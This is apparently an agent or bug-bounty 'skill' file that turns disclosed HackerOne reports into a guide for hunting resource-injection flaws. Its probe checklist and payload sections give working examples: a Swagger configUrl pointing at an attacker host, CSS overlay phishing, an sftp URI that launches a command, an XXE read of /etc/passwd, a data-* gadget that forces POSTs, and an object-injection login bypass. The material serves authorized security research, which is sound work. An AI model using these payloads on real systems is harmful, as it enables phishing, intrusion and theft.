---
name: hunt-resource-injection
description: Hunting skill for RESOURCE INJECTION — attacker-controlled resource identifiers, URLs, paths, URI schemes, config URLs, tags, type strings, filenames, and CSS url()/style values that reach a privileged sink. Built from 31 assigned reports (23 full disclosed reports mined, 9 from TOP lists): Nextcloud Desktop malicious-URI-scheme RCE (#1078002, $1,000), GitLab HTML/CSS injection escalated to arbitrary POST as victim via Rails Ujs data-* gadgets (#1533976 / #1409788, $8,690 each), Swagger UI configUrl injection (#2297561, #3124103), AWS Load Balancer Controller security-group tag injection (#1238017 / #1238482), Roundcube/Nextcloud CSS sanitizer bypasses (#3590583, #3590586), git branch-name = commit-hash checkout hijack (#790634, $2,000), Coinbase logo_url style injection (#315865), object injection → SQLi auth bypass (#1183335), and Slack HTTP parameter pollution (#335339). Use when hunting any feature that turns a user-supplied identifier into a fetched resource, a rendered style, a selected object, or an OS-level action.
sources: hackerone_public, top_lists, public_code_search
report_count: 31
full_reports_read: 23
---

## Crown Jewel Targets

"Resource injection" is the HackerOne weakness class where an attacker controls the *identifier* of a resource — a URL, a path, a filename, a tag, a type string, a branch/hash name, a CSS `url()`, a URI scheme — and that identifier is consumed by a privileged sink: a fetcher, a renderer, a package manager, a cloud controller, a component loader, or an OS shell handler. The bug is rarely "we let the user type a URL." It is "we let the user type a URL and then treated it as a trusted handle to something powerful."

In the 23 mined reports the privileged sinks fall into a handful of families. Prioritize targets in this order:

- **App loaders that accept a config/definition URL** — Swagger UI `?configUrl=` pulling a remote OpenAPI definition and rendering it in an authenticated origin (#2297561, #3124103). The sink turns a URL into executable UI configuration; the trusted hostname becomes a phishing/spoofing primitive.
- **HTML/CSS renderers and mail clients** — Roundcube's `rcube_washtml` / `rcube_utils.php` sanitizers, BBcode-to-CSS converters, style-tag interpolators. A value flows into a CSS `style` attribute or `background-image: url(VALUE)` (#587727, #3590583, #3590586, #315865). Remote-image blockers and position-fixed mitigations are theilters that get bypassed.
- **Desktop clients and native shells that open URIs** — Qt `QDesktopServices::openUrl()`, WebViews, deep-link handlers. A malicious server's login page supplies links with arbitrary URI schemes that invoke OS default applications (#1078002). This is the highest-severity family because the sink is the operating system.
- **Rich-content editors / notebook renderers / issue trackers** — GitLab Jira issue titles and Jupyter notebooks that render stored HTML without encoding, then get upgraded to arbitrary POST requests through a script gadget and a browser quirk (#1533976, #1409788, #1935628). The resource here is the rendered document; the sink is the victim's authenticated session.
- **Cloud infrastructure controllers that select resources by tag/name** — AWS Load Balancer Controller attaching the first security group matching `elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, `ingress.k8s.aws/resource` tags (#1238017, #1238482). An attacker creates a decoy resource with matching identifiers; the privileged controller adopts it.
- **Version-control / dependency resolution systems** — git checkout by name where a branch can impersonate a 40-hex commit hash (#790634). The identifier (a ref name) is confused with an immutable content address.
- **API endpoints with undeclared enums / type fields** — MangoPay "Legal Type" accepting `Soletrader` outside the documented set (#361189); object-valued parameters reaching a SQL builder (#1183335). The resource identifier is an enum member or an object shape.
- **Import / template / XML parsers** — meme generators with a `template` filename parameter and `DOMDocument->loadXML()` external entities (#415137). The identifier is a filename/XML entity that the parser resolves with privileges.
- **Parameter-pollution-prone form loaders** — outdated Greenhouse JS loading external forms via polluted parameters (#335339). The identifier is a duplicated query key that the client library resolves to the attacker's value.
- **Ledger / transaction amount fields** — crafted miner transactions where a zero-amount TX plus RingCT makes a wallet display an attacker-chosen XMR amount (#501585). The "resource identifier" is the transaction the wallet trusts.

Highest payouts in this corpus come from (a) native URI-handler RCE, (b) stored-HTML → authenticated-state-changing-request chains, and (c) cloud controllers that can be steered by forged resource identifiers. A plain CSS-injection-only report tends to land low/medium (#587727, #315865, #601192); the same primitive chained into a browser gadget becomes High (#1533976, #1409788).

### Privilege-of-sink ranking (why some identifiers are crown jewels)

| Sink family | Identifier controlled | Privilege inherited from sink | Corpus examples |
|---|---|---|---|
| OS scheme handler | URI scheme / deep link | Native app launch, arbitrary command execution | #1078002 |
| Authenticated browser session | Stored HTML / `data-*` | victim's cookies, CSRF-equivalent POSTs | #1533976, #1409788, #1935628 |
| Cloud controller (IAM-backed) | resource tags / annotations | modify ALB/SG rules account-wide | #1238017, #1238482 |
| XML/file parser | template filename / entity | filesystem read via external entities | #415137 |
| UI config loader | `configUrl` | trusted-origin rendering, phishing surface | #2297561, #3124103 |
| SQL builder / API enum | object shape / type string | auth bypass, unintended backend state | #1183335, #361189 |
| VCS checkout | ref name | code execution on consuming dependents | #790634 |
| CSS style engine | style token / `url()` | page redressing, overlay phishing | #587727, #3590583, #3590586, #315865 |

The rule of thumb: the severity tracks the *privilege of the consumer*, not the apparent harmlessness of the input. A single CSS token becomes High when it is the delivery mechanism for an authenticated POST (#1533976) and Low when it only moves a skull around a forum page (#587727).

---

## Attack Surface Signals

### Parameter & URL patterns to hunt

Swagger / OpenAPI loaders:
```
?configUrl=          # Swagger UI config injection (#2297561, #3124103)
?url=                # generic resource URL
?config=
?spec=
?definition=
?openapi=
?schemaUrl=
```

CSS/style/HTML sinks (resource *value* reaches a style attribute or `url()`):
```
style="background-image: url(VALUE)"
<body background=VALUE>
logo_url=            # Coinbase style-tag injection (#315865)
candidate=           # Shopify DOM/CSS injection (#601192)
[bbcode]=VALUE       # phpBB tag input → CSS style attribute (#587727)
title=               # Jira issue title rendered without encoding (#1533976)
template=            # meme template filename (#415137)
```

Cloud / infra identifiers:
```
ingress.k8s.aws/stack        # AWS LB Controller tag selectors (#1238017)
elbv2.k8s.aws/cluster        # SG association tags
ingress.k8s.aws/resource
annotations: alb.ingress.kubernetes.io/security-groups
legalType=Soletrader         # undeclared API enum (#361189)
```

Native / desktop / VCS:
```
sftp://…  ftp://…  s3://…     # URI schemes via QDesktopServices (#1078002)
git checkout <ref>           # branch name == commit hash (#790634)
```

### Client-side / source-review patterns

```javascript
// UI config pulled from a user-controlled URL, then rendered
const cfg = await fetch(new URLSearchParams(location.search).get('configUrl'));
SwaggerUIBundle({ url: cfg ... });

// Stored HTML rendered, then a generic gadget reads data-* attributes
container.dataset.dismissEndpoint   // arbitrary data- attrs survive DOMPurify (#1409788)
$.post(this.dismissEndpoint, ...)

// Values interpolated into a CSS style string
`background-image: url(${userValue})`   // #3590583
style.cssText = userValue               // #587727
```

### Sanitizer / filter signals (these are the things that get bypassed)

```
wash_uri() / allow_remote=false          # remote-image blocker (#3590583)
strcasecmp($value,'fixed')===0           # exact-match position:fixed check (#3590586)
explode_css_property_block()             # token-based CSS validation path (#3590586)
quote-stripping only (")                 # phpBB removes quotes but allows arbitrary CSS (#587727)
DOMPurify stripping only data-url/data-method, not arbitrary data-*
CSP blocking XSS but not CSS injection   # Coinbase (#315865)
input sanitized only at approval stage   # Legal Robot roadmap (#257207)
first matching tag wins                  # AWS LB Controller SG selection (#1238017)
```

### Response / behavior signals

- A config URL parameter changes the *origin context* of rendered UI (spoofing/phishing on a trusted host).
- An injected style attribute renders attacker-positioned elements (`position:fixed`) even though quotes are stripped.
- A value that should error ("Legal Type is wrong") succeeds silently for one undeclared enum member.
- A POST request fires as the victim after merely *viewing* content and navigating back (deferred JS gadget, #1533976).
- A resource gets adopted/replaced by the cloud controller even though the attacker lacks modify permission on it.
- `git checkout` resolves a branch where a hash is expected.

### Tech stack & framework signals

- **Swagger UI < 4.1.3** — the `?configUrl=` remote-definition loader is the exact vulnerable feature (#2297561). Check the version and the config UI.
- **Roundcube / rcube_washtml / rcube_utils** — HTML mail sanitizers with `wash_uri()`, `allow_remote`, and `sanitize_css_block()` (#3590583, #3590586).
- **Qt / QDesktopServices / WebView desktop clients** — native URI dispatch surfaces (#1078002, #1711847, #1707977).
- **Rails + DOMPurify + `$.post` / Ujs** — generic `data-*` gadgets that upgrade HTML injection to arbitrary POST (#1409788, #1533976).
- **Kubernetes + AWS Load Balancer Controller** — tag-driven managed-resource selection with broad IAM (#1238017, #1238482).
- **PHP `DOMDocument` / `loadXML` / serialized sessions** — parsers with external entities and template filename inputs (#415137).
- **Django/sqlstring-style query builders + public GitHub demo repos** — object injection into SQL, with a live demo environment to test (#1183335).
- **Greenhouse JS on careers pages** — outdated libs vulnerable to HTTP parameter pollution (#335339).
- **Git hostings that allow branch names equal to hashes** — ref-name vs content-address confusion (#790634).

### High-value identifier inventory checklist

Walk the app and tick each category; each tick is a potential resource-injection probe:

- [ ] Any parameter named `url`, `configUrl`, `spec`, `definition`, `template`, `file`, `path`, `src`, `source`
- [ ] Any style/CSS value assembled from request input (`background`, `logo_url`, BBcode tag input)
- [ ] Any enum/type field with a documented value set — test values from *downstream* API docs
- [ ] Any object-typed parameter where a scalar is expected
- [ ] Any tag/annotation/label used to look up or adopt a cloud resource
- [ ] Any ref, branch, tag, or version string used where an immutable hash/digest is expected
- [ ] Any field an admin or another user must view/confirm (stored-then-rendered elsewhere)
- [ ] Any client library that resolves a duplicated query key (parameter pollution)

---

## Discovery Patterns From 23 Full Reports

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

Ranked by the frequency the signal appears across the 23 mined reports, then by impact when discovered.

1. **Public code search (GitHub/gitlab public source)** — present in 13 reports, the single most productive recon surface. **What to look for:** any config/fetch call whose argument is derived from request input; sanitizer source files (`rcube_washtml.php`, `rcube_utils.php`); cloud controller tag-selection logic; open-source demo environments with a real database (#1183335). #1078002, #3590583, #3590586, #501585, #1183335, #1238017, #790634 all started from reading source.
2. **Image-processing / rendering surfaces** — 10 reports. **What to look for:** style attributes, `background-image`, screenshot/PDF generators, thumbnail fetchers, `logo_url`, `candidate=`. Even "harmless" CSS injection lives here (#315865, #601192, #587727).
3. **Search / filter / sort parameter reflection** — 9 reports. **What to look for:** request values echoed into the DOM or a style tag without encoding; sort/filter keys that become CSS properties or resource URLs.
4. **API endpoints, especially config/spec loaders** — 8 reports. **What to look for:** `?configUrl=` on Swagger UI, OpenAPI definition URLs, undeclared enum values, object-typed parameters (#2297561, #3124103, #361189, #1183335).
5. **Server-side rendering / sanitizer pipelines** — 5 reports. **What to look for:** HTML mail renderers, BBcode converters, notebook renderers — find the exact function that builds `style` or `url()` and check its validation (#3590583, #1533976).
6. **XML parsers / import features** — 4 and 3 reports. **What to look for:** `DOMDocument->loadXML()` on user-influenced content, template filename parameters, external entity resolution (#415137).
7. **Filter-bypass surfaces (WAF/sanitizer)** — 4 reports. **What to look for:** `strcasecmp` exact matches, quote-only filtering, token-based validators, `fixed` → `absolute` conversions (#3590586, #1533976).
8. **Admin / internal-only flows** — 4 reports. **What to look for:** admin confirmation dialogs that render attacker data (unconfirmed email HTML in an admin modal, #1935628); fields an admin views that an attacker controls.
9. **File upload / template selection** — 3 reports. **What to look for:** logo URL, meme template name, uploaded file whose name/path is later used as a resource identifier (#315865, #415137).
10. **JS source review / DOM gadgets** — 3 reports. **What to look for:** generic `data-*` attributes surviving DOMPurify, deferred initialization functions, `$.post(this.dismissEndpoint)` gadgets (#1409788, #1533976).
11. **SSO/OAuth & cloud metadata adjacency** — 3 reports. **What to look for:** IAM policies with broad resource permissions, managed-resource tag selectors, service accounts whose identity a forged resource can borrow (#1238017, #1238482).
12. **Parameter pollution / reflection / content spoofing** — 1–2 reports each. **What to look for:** duplicated query keys in client libraries (#335339), request URI reflected in error pages (#473144), roadmap/idea inputs sanitized only at approval (#257207).

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Frequencies are the count of full reports in the pack containing each signal.

| Signal (count) | Why it matters | What to probe |
|---|---|---|
| public-code-search (13) | Source reveals the sink and its validation directly; largest discovery source in the corpus. | Clone the public repo; grep for fetch/config/style interpolation; check demo environments. |
| image-processing (10) | Image/style paths are where CSS `url()` and remote-resource values land. | Inject into `background`, `logo_url`, thumbnail URLs; watch for `position:fixed`. |
| search-filter-sort (9) | Reflected request values become DOM/style content without encoding. | Put marker strings into sort/filter keys; inspect resulting HTML/CSS. |
| api-endpoint (8) | Config/spec endpoints turn a URL or enum into privileged behavior. | Swap `configUrl`, test undeclared enum values, send object-valued params. |
| server-side-rendering (5) | Sanitizers build `style`/`url()` from attacker data. | Read the sanitizer; test quote removal, `!important`, unquoted attributes. |
| xml-parser (4) | External entities resolve attacker-chosen resources with parser privileges. | Inject `<!DOCTYPE … SYSTEM "file:///…">` via template/config inputs. |
| filter-bypass (4) | Exact-match and tokenized checks are systematically bypassable. | Try `fixed !important`, case changes, extra tokens, double encoding. |
| admin-internal (4) | Admin views render attacker-controlled fields into powerful dialogs. | Control a field an admin must confirm; inject HTML into the modal title/body. |
| file-upload (3) | Uploaded/selected filenames become resource identifiers later. | Control the template/logo filename and trace where it is interpolated. |
| js-source-review (3) | Generic DOM gadgets convert HTML injection into state changes. | Look for `data-*` → `$.post(data.dismissEndpoint)` patterns surviving DOMPurify. |
| import-feature (3) | Imports pull remote definitions and parse them. | Supply remote OpenAPI/template URLs and XXE payloads. |
| sso-oauth (3) | Identity/resource wiring can be borrowed via forged identifiers. | Check IAM policy breadth and tag selectors on managed resources. |
| cloud-metadata (3) | Adjacent privileges make forged resources high impact. | Enumerate controller IAM permissions; test cross-namespace tag adoption. |
| dom-based (3) | Client-side insertion bypasses server encoding. | Use reflected markers in `candidate=`/`background=` and view-source the DOM. |
| dos-resource (3) | Resource-selection bugs can exhaust/steer infrastructure. | Create many matching-tag resources; observe which one the controller adopts. |
| proxy-feature (2) | Proxy/loader surfaces forward a chosen resource. | Point the loader at attacker/remote config and observe rendered origin. |
| comment-injection (2) | Comment/text fields feed style builders. | Inject CSS tokens into BBcode/body callbacks. |
| url-fetching (2) | Any fetch of an attacker-chosen definition is a resource-injection sink. | Use a canary URL to confirm the fetch, then escalate to config control. |
| parameter-pollution (1) | Duplicated keys resolve to attacker values in client libs. | Append a second `?parameter=attacker` and observe loaded resource. |
| reflected (1) | Unvalidated reflection in error/forbidden pages = spoofing. | Put arbitrary text in the request URI and view the forbidden page. |

### Verbatim Discovery Clues

All lines below are verbatim excerpts from the disclosed reports in the study pack (the `#id` tags are the real report IDs). These are the researchers' own "how I found it" and payload descriptions.

> [#1078002] During the Nextcloud `Add Account` flow, the server's login website is opened within a native window/`WebView`.

> [#1078002] A malicious server can serve a login website containing links with arbitrary URI schemes. Clicking those links immediately invokes the OS' default application to handle the URI.

> [#1078002] `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/` (not shown to the user in the connection assistant window, even on hover)

> [#1533976] But I found a way to bypass this.

> [#1533976] So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.

> [#1533976] This time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection.

> [#1533976] By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request.

> [#1409788] js , which is run on page load in the UI, I found multiple vectors still possible to abuse.

> [#1409788] An attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user.

> [#1409788] Nowadays DOMPurify strips Rails Ujs data-* attributes such as data-url and data-method. What is not stripped is arbitrary data attributes.

> [#1409788] In the "worst case" an attacker could make an admin create a new admin account for the attacker.

> [#415137] The website allows you to select a meme template, top text, and bottom text.

> [#415137] The `template` parameter sets a filename to use as part of the meme generation process.

> [#415137] That means the DOMDocument->loadXML() is vulnerable to external entities/DTDs and would allow us to execute malicious XXE payloads.

> [#257207] A limited-scope attack was possible since the input sanitization only occurred during the approval process.

> [#3590583] When `allow_remote` is set to `false`, Roundcube's HTML sanitizer rcube_washtml blocks external resources in image-loading attributes by checking their values through `wash_uri()`.

> [#3590583] The body callback processes the `background` attribute from the email's `<body>` element and constructs an inline CSS `background-image: url(VALUE)`.

> [#3590586] However, the check uses `strcasecmp($value, 'fixed') === 0`, which requires the **entire** trimmed value to be exactly `"fixed"`. The value `"fixed !important"` fails this comparison.

> [#315865] When creating a product, users can upload a logo. The logo_url was not escaped properly, allowing an attacker to inject malicious characters into a style tag.

> [#315865] This vulnerability did not allow for XSS due to our CSP, however, it did allow for CSS injection.

> [#587727] The input to the "█████" BBcode tag is not properly filtered. It gets converted into a CSS style attribute for a span HTML element.

> [#587727] Quotes (") are removed, so there's no way to break out of the CSS style attributed. However it is possible to arbitrarily dress the resulting span element.

> [#790634] Git will checkout the branch and not the hash when someone puts "git checkout e91803d442559d6efb63102b10c919e10901b01d".

> [#790634] GitHub prevents users from pushing branches that are the same name as hashes, but GitLab does not.

> [#2297561] Navigate to the endpoint that hosts the Swagger UI, and insert the payload through "?configUrl=" GET parameters.

> [#3124103] Observe that the Swagger UI configuration is injected from an external JSON source.

> [#361189] When another value is provided, an error message is printed saying the Legal Type is wrong. This error message is not printed and request success when the value "Soletrader" is provided.

> [#1183335] It is possible to use an object injection failure to achieve a sql injection, where attacker uses the means to bypass authentication.

> [#1238017] An attacker is able to craft another SG that can be used to trick AWS Load Balancer Controller into changing the SG attached to an ALB.

> [#601192] `https://interviewing.shopify.com/index.php?candidate=` is inserting the value of `candidate` into the DOM without any filtering (except that the equal sign can't appear in the payload).

> [#1711847] Create a group conversation with the name `<img src="https://avatars.githubusercontent.com/u/99037623">`.

> [#1707977] Set the `Full Name` of your user to `<img src="https://avatars.githubusercontent.com/u/99037623">`.

> [#601192] HTML injection, mostly CSS injection.

> [#473144] the `https://surveyserver.nextcloud.com` domain is vulnerable against `content spoofing` in the `forbidden page` due to the fact that the `request URI` is reflected without validation.

> [#1935628] an attacker can register an account and login, then change their email to include an HTML payload.

### Probe Checklist (15 concrete probes)

1. **Swap the Swagger config URL** — `?configUrl=https://attacker/evil.json`; confirm the UI renders attacker-supplied config on the trusted origin (#2297561, #3124103).
2. **Inject a BBcode/tag value into a CSS style attribute** — test whether quotes are stripped but arbitrary CSS tokens survive; add `position:fixed` to redress the page (#587727).
3. **Unquoted `<body background=…>` into `background-image: url(VALUE)`** — send an HTML email with `background:https://attacker/x` while `allow_remote=false` (#3590583).
4. **`position: fixed !important`** against a sanitizer that converts `position:fixed` → `position:absolute` via exact string compare (#3590586).
5. **`logo_url` into a style tag** — inject `;color:red;background:url(…)` into a product-logo URL field; CSP may block XSS but not CSS (#315865).
6. **`candidate=` HTML/CSS injection** — append `%3Cstyle%3E*%7Bbackground:url(attacker)%7D%3C/style%3E`; check `=` filtering only (#601192).
7. **Stored HTML → arbitrary POST** — put `<img src=x onerror=…>`-style markup plus a `data-*` gadget in a Jira title / notebook; then navigate away and back to trigger deferred JS (#1533976, #1409788).
8. **HTML into admin-confirmed fields** — set a user's unconfirmed email to HTML and have an admin manually confirm; check the modal title/body (#1935628).
9. **`<img src=…>` as a display name / group-chat name** — inject into Full Name, Status Message, or conversation name; observe the desktop client rendering HTML (#1711847, #1707977).
10. **Branch name = commit hash** — create a branch named exactly like a 40-hex hash and see whether dependent `git checkout <hash>` resolves the branch (#790634).
11. **Undeclared API enum value** — change `<option value="BUSINESS">` to `Soletrader` client-side and submit; watch the "wrong type" error disappear (#361189).
12. **Object-valued parameter for a scalar field** — `{"email":{"email":1},"password":"…"}` at `/auth/login` to trigger object injection → SQL confusion (#1183335).
13. **Cloud controller tag forgery** — create a security group with `elbv2.k8s.aws/cluster` + `ingress.k8s.aws/stack` + `ingress.k8s.aws/resource` tags matching a target Ingress and observe adoption (#1238017, #1238482).
14. **Template filename + XXE** — set the meme `template` parameter to a controlled filename and post XML with external entities to `DOMDocument->loadXML()` (#415137).
15. **HTTP parameter pollution / request-URI reflection** — add a duplicated Greenhouse form key (#335339); or put arbitrary text in a request URI reflected in a forbidden page (#473144); or sanitize a roadmap idea only at approval (#257207).

---

## Step-by-Step Hunting Methodology

1. **Build a resource-identifier inventory.** Spider the target for every parameter that names, selects, loads, or renders something: `configUrl`, `url`, `template`, `logo_url`, `candidate`, `title`, sort/filter keys, type enums, tag selectors, ref/hash names, URI schemes. This inventory is the attack surface; in the corpus, public code search (#1078002, #1183335, #1238017) and JS review (#1409788, #1533976) produced it fastest.

2. **Classify each identifier by its downstream sink.** Ask: is this value (a) fetched as a document, (b) interpolated into CSS/HTML, (c) used to select a cloud/native resource, (d) parsed as XML, or (e) rendered into a privileged desktop/shell handler? The class determines the probe and the impact. A `configUrl` is class (a) and becomes UI-config injection (#2297561); a CSS `background` is class (b) (#3590583); a URI scheme in a WebView is class (e) (#1078002).

3. **Read the validator before the payload.** For class (b)/(c), locate the exact check. In #3590586 it was `strcasecmp($value,'fixed')===0`; in #3590583 it was `wash_uri()` under `allow_remote=false`; in #1238017 it was "first matching tag wins"; in #790634 it was the absence of a hash-name guard. A validator you can read is a validator you can bypass.

4. **Plant a canary and confirm the resource is actually consumed.** For fetch-driven classes, point the identifier at a unique callback URL/DNS name you control and verify the hit before escalating. For render-driven classes, use a marker string and view-source the resulting DOM/CSS to confirm it reached the sink. Do not claim loader SSRF from an echoed URL alone — the corpus's Swagger cases are about *rendered config*, not proof of blind fetch.

5. **Escalate the primitive by the sink's privilege.**
   - Rendered UI config → spoofing/phishing on a trusted origin (#2297561, #3124103).
   - CSS injection → UI redressing / full-viewport phishing overlay via `position:fixed !important` (#3590586), or arbitrary element placement (#587727).
   - Stored HTML + DOM gadget → arbitrary POST as the victim, including admin account creation (#1409788, #1533976).
   - URI scheme → OS default handler → RCE on the desktop client (#1078002).
   - Forged tag → cloud controller adopts attacker resource, altering network exposure (#1238017, #1238482).
   - Filename + XML parser → XXE (#415137).
   - Enum/object injection → auth bypass / SQLi (#361189, #1183335).

6. **Test the bypass class appropriate to the validator.** For exact-match string checks, append tokens (`fixed !important`). For quote-stripping, stay inside the attribute and use CSS tokens. For sanitizers that strip only known `data-*` attributes, use *arbitrary* ones. For "first match wins" selectors, register a decoy with matching identifiers. For name-vs-hash confusion, create the colliding name.

7. **Check where sanitization happens in the lifecycle.** #257207 was exploitable only because input was sanitized at *approval*, not at creation — test every stage (create, store, render, approve, admin-view) for the one that skips validation.

8. **Chains before submission.** A lone CSS injection is a low/medium finding (#315865, #601192). Look for the amplifier: a script gadget (#1533976), an admin dialog (#1935628), a browser quirk on back-navigation (#1533976), a CSP that blocks scripts but not styles (#315865), or an OS handler (#1078002).

9. **Attribute the sink to one parameter.** If a callback or render occurred, isolate which identifier caused it by testing one field at a time; negative controls belong in the report so the fix targets the right field.

10. **Document the full chain with a reliable repro.** Include the exact identifier, the sink it reached, the privileged action performed, and a 10-minute reproduction. For timing-dependent gadgets (back-button deferred JS), note the exact navigation sequence.

### Detection infrastructure & canary discipline

- **Use a unique canary per identifier.** One callback/listener per candidate field so attribution is unambiguous; a batch of payloads that all fire tells you nothing about which field is the sink.
- **For render-driven classes, use view-source markers.** A distinct string in each candidate field confirms which one reached the DOM/style sink (#601192, #3590583).
- **Separate "consumed" from "safe."** A rendered marker or a callback proves the identifier is used — it does not prove the downstream action is privileged. Show the POST, the adopted SG, or the file read.
- **Keep a clean negative control.** Record fields that produce no render/callback; this is evidence for the fix and prevents naming the wrong parameter.
- **Mirror the OOB gate for fetch-based identifiers.** If the identifier triggers a server-side fetch, require a DNS/HTTP hit on a listener you control before describing it as SSRF-adjacent; an echoed URL is not proof of a fetch.

---

## Payload & Detection Patterns

### Swagger / config-URL injection
```
GET /swagger-ui.html?configUrl=https://attacker.example/evil.json
GET /?configUrl=https://attacker.example/spec.yaml
# evil.json defines hosts/schemes/urls/swagger fields that render attacker UI
# on the trusted origin — phishing / spoofing primitive (#2297561, #3124103)
```

### CSS / style attribute injection
```
# BBcode tag input → CSS style attribute (#587727)
[tag]position:fixed;top:0;left:0;width:100vw;height:100vh;background:url(attacker)[/tag]

# Unquoted body background → background-image:url(VALUE), bypasses allow_remote (#3590583)
<body background="https://attacker/x.png">

# position:fixed mitigation bypass (#3590586)
.overlay { position: fixed !important; top:0; left:0; z-index:9999; }

# logo_url style injection; CSP blocks XSS, not CSS (#315865)
https://target/product?logo_url=x;background:url(https://attacker/)

# candidate= HTML/CSS injection (#601192)
?candidate=z%3Cstyle%3E%20*%20{%20background:%20url(https://attacker/logo.png);%20}
```

### Stored HTML → arbitrary POST (Rails Ujs data-* gadget)
```
# Jupyter notebook / Jira issue title carrying generic data-* attributes
<div data-url="/admin/users" data-method="post" data-params="...">…</div>
# DOMPurify strips data-url/data-method but NOT arbitrary data-*;
# a deferred init reads container.dataset and $.post(...) it (#1409788)
# Back-navigation accelerates the deferred data call into the gadget (#1533976)
```

### Native URI-scheme RCE (Qt QDesktopServices)
```
sftp://user:pass;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/
# Malicious login page in the Add Account WebView supplies the link;
# click invokes the OS default handler (WinSCP) → command execution (#1078002)
```

### Cloud tag forgery
```
# Create a security group with the controller's expected tags:
elbv2.k8s.aws/cluster   = <cluster-id>
ingress.k8s.aws/stack   = <stack-name>
ingress.k8s.aws/resource= <resource>
# Controller attaches the FIRST matching SG → attacker steers ALB exposure (#1238017)
```

### API enum / object injection
```
# Undeclared enum value (#361189)
<option value="Soletrader">Enterprise</option>

# Object injection → SQL confusion / auth bypass (#1183335)
POST /auth/login
{"email":{"email":1},"password":"1234"}
```

### VCS ref confusion / XXE / pollution
```
git checkout e91803d442559d6efb63102b10c919e10901b01d   # branch shadows hash (#790634)
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>  # template parser (#415137)
?form_id=legit&form_id=attacker                          # parameter pollution (#335339)
```

### Detection / grep patterns
```bash
# Find sinks where request input becomes a resource identifier
grep -rE "(configUrl|logo_url|template|candidate|background|url)\s*[:=]\s*(req|params|location\.search)" -i
grep -rE "background-image|cssText|style\.setProperty|loadXML\(\)" -r .
grep -rE "strcasecmp|explode_css_property_block|wash_uri|allow_remote" -r .   # validators to bypass
grep -rE "data-[a-z-]+|dataset\.|deferredInitialisation" app/assets/javascripts
grep -rE "ingress\.k8s\.aws|elbv2\.k8s\.aws" -r .                           # tag selectors
```

### Canary & confirmation snippets

```bash
# Point a fetch-driven identifier at a unique canary and watch for the hit
curl -s "https://target/swagger?configUrl=https://UNIQUE.oast.example/spec.json"
# confirm the renderer consumed it (rendered markers, not just a reflected URL)

# CSS sink confirmation: marker value in a style context
?candidate=ZZMARKERZZ%3Cstyle%3E*%7Bbackground:url(https://UNIQUE.oast.example/x)%7D%3C/style%3E
# view-source: does the marker reach style/url() on the trusted origin?

# Parameter-isolation: one candidate identifier at a time
for p in configUrl url spec definition; do
  echo "== $p"; curl -s "https://target/?${p}=https://UNIQUE-$p.oast.example/x"; done
# poll listener per sub-tag and attribute the render/fetch to exactly one field
```

### Payload selection by sink (quick map)

- **CSS/style attribute** → use token-injection payloads from the CSS section; expect Low/Medium unless a gadget exists (#587727, #315865).
- **Config/spec URL** → use the Swagger payload; expect spoofing/phishing on a trusted origin (#2297561, #3124103).
- **Stored HTML + script gadget** → use the `data-*` payload plus back-navigation; expect High/arbitrary POST (#1409788, #1533976).
- **Native URI** → use the `sftp://`/WinSCP payload; expect RCE on the desktop client (#1078002).
- **Cloud tags** → use the decoy-SG payload; expect network-exposure change (#1238017, #1238482).
- **Type/enum/object** → use `Soletrader` or `{"email":{"email":1}}`; expect auth bypass/unintended backend state (#361189, #1183335).
- **Filename/XML** → use the template + external entity payload; expect XXE/file read (#415137).

---

## Common Root Causes

1. **User-controlled value reaches a privileged sink unencoded.** The feature is legitimate; the missing transform is the bug. Jira issue titles and notebook cells rendered without HTML encoding (#1533976, #1409788), `logo_url` interpolated into a style tag (#315865), `candidate` inserted into the DOM (#601192).

2. **Confusing an identifier for a trusted handle.** A ref name is treated as an immutable hash (#790634); an undeclared enum member is treated as valid because the downstream API accepts it (#361189); a tag-matched security group is assumed to be the controller's own managed resource (#1238017, #1238482).

3. **Validators that check the wrong property or check exactly.** `strcasecmp($value,'fixed')===0` misses `fixed !important` (#3590586); quote-stripping in BBcode still allows arbitrary CSS (#587727); `wash_uri()` + `allow_remote=false` is bypassed through an unquoted `background` attribute (#3590583). The check exists but is structurally insufficient.

4. **Sanitization applied at the wrong lifecycle stage.** Legal Robot sanitized roadmap ideas only at approval, leaving creation-time injection (#257207). Admin confirmations render attacker data that was never treated as untrusted in that context (#1935628).

5. **Over-permissive downstream identity/permissions.** The AWS LB Controller's IAM policy and "first matching tag" logic let an unprivileged attacker steer a privileged controller (#1238017, #1238482). A native `openUrl()` handler dispatches arbitrary schemes to OS applications (#1078002).

6. **Generic client-side gadgets amplification.** DOMPurify's denylist stripped only `data-url`/`data-method`, leaving arbitrary `data-*` that a generic deferred-init function turns into a POST (#1409788, #1533976). The+XSS-adjacent primitive is upgraded to a state-changing request.

7. **Parsers resolving external resources.** `DOMDocument->loadXML()` with external entities on a user-influenced template path (#415137); remote OpenAPI definitions loaded and rendered as trusted config (#2297561, #3124103).

8. **Client libraries trusting duplicated/polluted parameters.** Outdated Greenhouse JS resolved a polluted key to an external form (#335339); request URIs reflected without validation into error pages (#473144).

### Root cause → evidence map

| Root cause | Direct evidence in the pack | Fix implication |
|---|---|---|
| Missing encoding of stored fields | "renders without proper HTML encoding" (#1533976) | encode at render, not just at input |
| Identifier/handle confusion | "Git will checkout the branch and not the hash" (#790634) | reject ambiguous refs; pin content addresses |
| Structurally weak validators | `strcasecmp($value,'fixed')===0` (#3590586) | normalize before compare; allowlist tokens |
| Wrong lifecycle stage | "sanitization only occurred during the approval process" (#257207) | sanitize at creation and at every render |
| Over-permissive downstream identity | "modify rules of any SG that the attacker is able to tag" (#1238482) | scope IAM; verify ownership, not just tags |
| Generic client gadget | "What is not stripped is arbitrary data attributes" (#1409788) | denylist by default; bind explicit endpoints |
| External resource resolution | `DOMDocument->loadXML()` external entities (#415137) | disable DTD/entity resolution |
| Unvalidated reflection | "request URI is reflected without validation" (#473144) | contextual output encoding |

---

## Bypass Techniques

